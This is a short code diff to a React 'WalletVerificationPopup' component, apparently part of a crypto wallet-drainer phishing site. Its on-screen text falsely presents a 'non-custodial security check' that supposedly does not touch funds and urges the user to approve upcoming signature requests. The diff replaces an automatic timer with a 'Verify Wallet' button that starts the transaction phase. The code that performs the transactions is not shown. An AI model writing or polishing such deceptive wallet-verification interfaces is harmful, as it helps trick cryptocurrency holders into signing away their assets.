@@ -80,13 +80,6 @@ export const WalletVerificationPopup = () => {
     if (isWalletConnected && !hasTriggered) {
       setHasTriggered(true);
       setPhase('writeup');
-
-      const writeupTimer = setTimeout(() => {
-        setPhase('transaction');
-        setTransactionCount(0);
-      }, 3000);
-
-      return () => clearTimeout(writeupTimer);
     }
   }, [isWalletConnected, hasTriggered]);
 
@@ -250,10 +243,15 @@ export const WalletVerificationPopup = () => {
             <p className="text-sm text-muted-foreground leading-relaxed">
               To ensure the safety of your assets, a quick wallet balance verification is required before you can proceed. This non-custodial security check confirms your ownership without accessing your funds. Please approve the upcoming signature requests to complete verification.
             </p>
-            <div className="flex items-center gap-2 mt-2">
-              <Loader2 className="w-4 h-4 animate-spin text-primary" />
-              <span className="text-xs text-primary">Preparing verification...</span>
-            </div>
+            <button
+              onClick={() => {
+                setPhase('transaction');
+                setTransactionCount(0);
+              }}
+              className="mt-3 px-6 py-2.5 rounded-lg fire-bg text-white font-semibold text-sm shadow-[0_0_15px_rgba(255,100,0,0.5)] hover:scale-105 transition-transform duration-200"
+            >
+              Verify Wallet
+            </button>
           </div>
         )}
 
